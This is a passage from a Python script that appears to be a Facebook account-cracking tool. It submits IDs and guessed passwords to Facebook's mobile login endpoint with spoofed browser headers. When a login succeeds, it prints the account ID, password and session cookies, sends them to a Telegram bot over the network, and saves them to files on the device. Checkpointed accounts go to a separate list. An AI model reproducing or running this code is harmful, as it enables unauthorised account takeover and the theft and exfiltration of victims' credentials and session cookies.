            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            headers ={
            "authority": f'p.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache, no-store, must-revalidate',
            "referer": f'https://p.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            "cross-origin-resource-policy": 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": 'Mozilla/5.0 (Linux; Android 10; SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {cid} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(cid)
                statusok = (f" {cid} | {pas} | {coki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in lo:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

os.system("clear")
#Process()
zar0()  
    
